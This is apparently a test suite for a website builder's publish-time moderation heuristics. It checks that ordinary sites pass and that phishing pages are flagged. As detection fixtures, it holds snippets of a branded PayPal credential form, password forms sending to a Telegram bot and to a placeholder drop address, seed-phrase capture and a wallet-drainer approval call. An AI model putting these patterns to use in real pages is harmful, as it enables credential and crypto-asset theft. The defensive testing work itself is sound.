// lib/moderation.ts — the publish-time abuse signal layer.
//
// The FALSE POSITIVES matter more than the true positives. A missed phishing
// page is one abuse report; a blocked coffee shop is a customer who cannot
// publish their own site and has no idea why. So the clean-pass cases below
// are the load-bearing ones, and each is written as a plausible real site
// rather than a minimal string.
//
// Every test restores the heuristic provider, because setModerationProvider
// mutates module state and node:test shares one process across files.

import test from "node:test";
import assert from "node:assert/strict";

import {
  blockingFindings,
  heuristicProvider,
  moderateForPublish,
  setModerationProvider,
} from "../lib/moderation.ts";

const rules = (result) => result.findings.map((f) => f.rule);
const analyze = (files) => moderateForPublish(files);

/** Assert nothing in this site would refuse a publish. */
async function assertPublishable(files, why) {
  const result = await analyze(files);
  const blocking = blockingFindings(result);
  assert.deepEqual(
    blocking.map((f) => `${f.rule}: ${f.evidence}`),
    [],
    `${why} — publish would have been refused`,
  );
}

// ── False positives: real sites that must publish ──────────────────────────

test("a real product login page is not blocked", async () => {
  await assertPublishable(
    [
      {
        path: "src/pages/Login.tsx",
        content: `
          export default function Login() {
            return (
              <main className="mx-auto flex min-h-screen max-w-md flex-col justify-center gap-6 px-6">
                <h1 className="text-2xl font-semibold">Log in to Ledgerly</h1>
                <form onSubmit={handleSubmit} className="flex flex-col gap-4">
                  <label htmlFor="email">Work email</label>
                  <input id="email" name="email" type="email" autoComplete="email" required />
                  <label htmlFor="password">Password</label>
                  <input id="password" name="password" type="password" autoComplete="current-password" required />
                  <button type="submit">Continue</button>
                </form>
                <a href="/reset">Forgot your password?</a>
              </main>
            );
          }`,
      },
    ],
    "a product's own login page",
  );
});

test("an OAuth button next to a password field is not a clone of that brand", async () => {
  // "Sign in with Google" beside a password box is the most common legitimate
  // login page on the internet.
  for (const provider of ["Google", "Facebook", "Apple", "Microsoft"]) {
    await assertPublishable(
      [
        {
          path: "src/Login.tsx",
          content: `
            <h1>Sign in to Ledgerly</h1>
            <button>Continue with ${provider}</button>
            <form><input type="email" /><input type="password" /><button>Log in</button></form>`,
        },
      ],
      `an OAuth button for ${provider}`,
    );
  }
});

test("a coffee shop using formsubmit.co for its contact form is not blocked", async () => {
  const files = [
    {
      path: "index.html",
      content: `<!doctype html><html><head><title>Bean There</title></head><body>
        <h1>Bean There Coffee</h1>
        <p>Order on Deliveroo. Follow us on Instagram. Now on Spotify: our shop playlist.</p>
        <form action="https://formsubmit.co/hello@beanthere.example" method="POST">
          <input type="text" name="name" placeholder="Your name" />
          <input type="email" name="email" placeholder="Your email" />
          <textarea name="message"></textarea>
          <button type="submit">Send</button>
        </form>
      </body></html>`,
    },
    { path: "src/App.css", content: `.btn { background: #6f4e37; }` },
  ];
  await assertPublishable(files, "a coffee shop contact form");
  assert.deepEqual(rules(await analyze(files)), [], "a plain contact form produced findings at all");
});

test("a formsubmit.co contact form far from a members login is not read as exfil", async () => {
  // The proximity rule earns its keep here: a site with a contact form in the
  // footer and a login on another screen would otherwise be blocked outright.
  const files = [
    {
      path: "dist/assets/index-a1b2c3.js",
      content:
        `jsx("form",{action:"https://formsubmit.co/hello@barbers.example"},jsx("input",{type:"email"}))` +
        "n".repeat(1500) +
        `jsx("form",null,jsx("input",{type:"password",name:"pw"}))`,
    },
  ];
  await assertPublishable(files, "a contact form and a login in one bundle");
  assert.ok(!rules(await analyze(files)).includes("credential-exfil-channel"));
});

test('a "never share your seed phrase" explainer is not treated as a drainer', async () => {
  const files = [
    {
      path: "src/components/Safety.tsx",
      content: `
        <section>
          <h2>Keep your wallet safe</h2>
          <p>Never share your seed phrase with anyone. No exchange, wallet or support
             agent will ever ask you to enter your recovery phrase into a website.</p>
          <form role="search"><input type="search" placeholder="Search guides" /></form>
        </section>`,
    },
  ];
  await assertPublishable(files, "wallet-safety education copy");
  // Downgraded, not dropped: it is still worth having in the record if the
  // site is ever reported.
  const found = (await analyze(files)).findings.filter((f) => f.rule === "wallet-seed-phrase-capture");
  assert.ok(found.every((f) => f.severity === "low"), "warning copy was not downgraded");
});

test("prose about seed phrases with no form nearby produces nothing at all", async () => {
  const result = await analyze([
    { path: "src/Blog.tsx", content: `<article><p>A recovery phrase is twelve words your wallet generates.</p></article>` },
  ]);
  assert.deepEqual(rules(result), []);
});

test("a film blog that mentions Netflix and has a member login is not blocked", async () => {
  await assertPublishable(
    [
      {
        path: "index.html",
        content:
          `<p>Now streaming on Netflix, and available on Amazon.</p>` +
          "<p>filler</p>".repeat(60) +
          `<form><label>Password</label><input type="password" /></form>`,
      },
    ],
    "a brand mention hundreds of characters from the login form",
  );
});

test("an ordinary marketing site produces no findings whatsoever", async () => {
  const result = await analyze([
    { path: "index.html", content: `<!doctype html><html><head><title>Ridgeway Plumbing</title></head><body><h1>Ridgeway Plumbing</h1><p>Call 0113 496 0000.</p></body></html>` },
    { path: "src/App.tsx", content: `export default function App() { return <Hero />; }` },
    { path: "src/index.css", content: `:root { --brand: #0f766e; }` },
  ]);
  assert.deepEqual(rules(result), []);
});

// ── True positives ─────────────────────────────────────────────────────────

test("a branded credential form is a high-severity finding", async () => {
  const result = await analyze([
    {
      path: "index.html",
      content: `<h1>PayPal</h1><p>Your account has been limited. Sign in to your account to verify your identity.</p>
                <form><input type="email" /><input type="password" name="pw" /></form>`,
    },
  ]);
  assert.ok(rules(result).includes("brand-impersonation-credential-form"));
  assert.ok(blockingFindings(result).length > 0);
});

test("brand impersonation needs a password field, not just the brand name", async () => {
  const result = await analyze([
    { path: "index.html", content: `<h1>PayPal</h1><p>Sign in to your account to verify your identity.</p>` },
  ]);
  assert.deepEqual(rules(result), [], "copy alone, with no credential form, must not fire");
});

test("credentials wired to a Telegram bot are a high-severity finding", async () => {
  const result = await analyze([
    {
      path: "dist/assets/index.js",
      content: `const f=e=>fetch("https://api.telegram.org/bot7:AAA/sendMessage",{method:"POST",body:e});jsx("input",{type:"password"})`,
    },
  ]);
  assert.ok(rules(result).includes("credential-exfil-channel"));
  assert.ok(blockingFindings(result).length > 0);
});

test("a formsubmit.co action ON the password form itself is exfil", async () => {
  const result = await analyze([
    { path: "src/Login.tsx", content: `<form action="https://formsubmit.co/drop@evil.example"><input type="password" /></form>` },
  ]);
  assert.ok(rules(result).includes("credential-exfil-channel"));
});

test("a form collecting a seed phrase is a high-severity finding", async () => {
  for (const label of ["seed phrase", "secret recovery phrase", "12-word phrase", "wallet private key"]) {
    const result = await analyze([
      { path: "src/Restore.tsx", content: `<h2>Restore wallet</h2><label>Enter your ${label}</label><input type="text" name="s" />` },
    ]);
    const seed = result.findings.filter((f) => f.rule === "wallet-seed-phrase-capture");
    assert.ok(seed.length > 0, label);
    assert.ok(seed.some((f) => f.severity === "high"), `${label} was not high severity`);
  }
});

test("wallet connect plus an asset-delegation primitive is a drainer", async () => {
  const result = await analyze([
    {
      path: "dist/assets/index.js",
      content: `await window.ethereum.request({method:"eth_requestAccounts"});await c.setApprovalForAll(op,true)`,
    },
  ]);
  assert.ok(rules(result).includes("wallet-drainer-approval"));
  assert.ok(blockingFindings(result).length > 0);
});

test("a raw 4-byte selector is caught even when the method name did not survive the build", async () => {
  const result = await analyze([
    { path: "dist/assets/index.js", content: `window.ethereum.request({method:"eth_requestAccounts"});d="0xa22cb465"+p` },
  ]);
  assert.ok(rules(result).includes("wallet-drainer-approval"));
});

test("wallet connect on its own is recorded, not blocked", async () => {
  const result = await analyze([
    { path: "src/Connect.tsx", content: `const p = new BrowserProvider(window.ethereum); await p.send("eth_requestAccounts", []);` },
  ]);
  assert.deepEqual(rules(result), ["wallet-connect-present"]);
  assert.deepEqual(blockingFindings(result), []);
});

test("eval of a decoded string is recorded, not blocked", async () => {
  const result = await analyze([{ path: "dist/assets/index.js", content: `eval(atob("ZmV0Y2goJy8nKQ=="))` }]);
  assert.deepEqual(rules(result), ["runtime-obfuscated-payload"]);
  assert.deepEqual(blockingFindings(result), []);
});

test("a password field on a static site is recorded at low severity", async () => {
  const result = await analyze([{ path: "src/Demo.tsx", content: `<input type="password" name="pw" />` }]);
  assert.deepEqual(rules(result), ["password-form-on-static-site"]);
  assert.deepEqual(blockingFindings(result), []);
});

test("the minified shape of a password field is matched, not just the JSX one", async () => {
  const authored = await analyze([{ path: "src/Login.tsx", content: `<input type="password" />` }]);
  const minified = await analyze([{ path: "dist/assets/i.js", content: `jsx("input",{type:"password"})` }]);
  assert.deepEqual(rules(authored), rules(minified));
});

// ── Engine behaviour ───────────────────────────────────────────────────────

test("stylesheets and sourcemaps are skipped", async () => {
  const result = await analyze([
    { path: "src/App.css", content: `/* type="password" https://api.telegram.org/bot1/sendMessage */` },
    { path: "dist/assets/index.js.map", content: `{"sourcesContent":["type=\\"password\\" api.telegram.org/bot1"]}` },
  ]);
  assert.deepEqual(rules(result), []);
});

test("inlined base64 payloads are stripped before scanning", async () => {
  // Base64 will happily contain any substring you like; an inlined image is
  // bytes, not content.
  const result = await analyze([
    { path: "src/Logo.tsx", content: `<img src="data:image/png;base64,dHlwZT0icGFzc3dvcmQi" alt="logo" />` },
  ]);
  assert.deepEqual(rules(result), []);
});

test("findings are capped per rule so one file cannot flood the record", async () => {
  const content = Array.from({ length: 12 }, (_, i) => `<h1>PayPal</h1><p>Sign in to your account ${i}</p><input type="password" />`).join("");
  const result = await analyze([{ path: "index.html", content }]);
  for (const rule of new Set(rules(result))) {
    assert.ok(rules(result).filter((r) => r === rule).length <= 3, `rule ${rule} exceeded the cap`);
  }
});

test("evidence is a short, whitespace-collapsed snippet, never the whole file", async () => {
  const result = await analyze([
    { path: "src/Login.tsx", content: `<div>\n\n   <input\n     type="password"\n   />\n\n</div>` + "z".repeat(5000) },
  ]);
  assert.ok(result.findings.length > 0);
  for (const f of result.findings) {
    assert.ok(f.evidence.length < 400, `evidence was ${f.evidence.length} characters`);
    assert.ok(!/\n/.test(f.evidence), "evidence contains a newline");
    assert.ok(!/ {2}/.test(f.evidence), "evidence contains runs of whitespace");
  }
});

test("every finding carries the path it came from and a usable note", async () => {
  const result = await analyze([
    { path: "src/pages/Login.tsx", content: `<h1>PayPal</h1><p>Sign in to your account</p><input type="password" />` },
  ]);
  assert.ok(result.findings.length > 0);
  for (const f of result.findings) {
    assert.equal(f.path, "src/pages/Login.tsx");
    assert.ok(["high", "medium", "low"].includes(f.severity));
    assert.ok(f.note.length > 20);
  }
});

test("blockingFindings selects exactly the high-severity findings", async () => {
  const result = await analyze([
    { path: "a.tsx", content: `<h1>PayPal</h1><p>Sign in to your account</p><input type="password" />` },
  ]);
  assert.ok(result.findings.some((f) => f.severity !== "high"), "fixture needs a non-blocking finding too");
  assert.deepEqual(blockingFindings(result), result.findings.filter((f) => f.severity === "high"));
});

test("scanning is deterministic — no leaked regex lastIndex between runs", async () => {
  // Nearly every matcher here is /g, and a /g regex carries lastIndex. Running
  // the same input twice must give the same answer.
  const files = [
    { path: "a.tsx", content: `<h1>PayPal</h1><p>Sign in to your account</p><input type="password" />` },
    { path: "b.js", content: `window.ethereum; setApprovalForAll(x,true); eval(atob("aA=="))` },
  ];
  const first = await analyze(files);
  const second = await analyze(files);
  assert.deepEqual(second.findings, first.findings);
  assert.deepEqual((await analyze(files)).findings, first.findings);
});

test("an empty publish is clean", async () => {
  const result = await analyze([]);
  assert.deepEqual(result.findings, []);
  assert.equal(result.provider, "heuristics-v1");
});

test("the provider seam swaps cleanly and reports its own name", async () => {
  try {
    setModerationProvider({
      name: "stub-classifier",
      analyze: async () => [
        { rule: "password-form-on-static-site", severity: "high", path: "x", evidence: "e", note: "n" },
      ],
    });
    const result = await analyze([{ path: "clean.tsx", content: "<p>nothing here</p>" }]);
    assert.equal(result.provider, "stub-classifier");
    assert.equal(blockingFindings(result).length, 1);
  } finally {
    setModerationProvider(heuristicProvider);
  }
  assert.equal((await analyze([])).provider, "heuristics-v1");
});
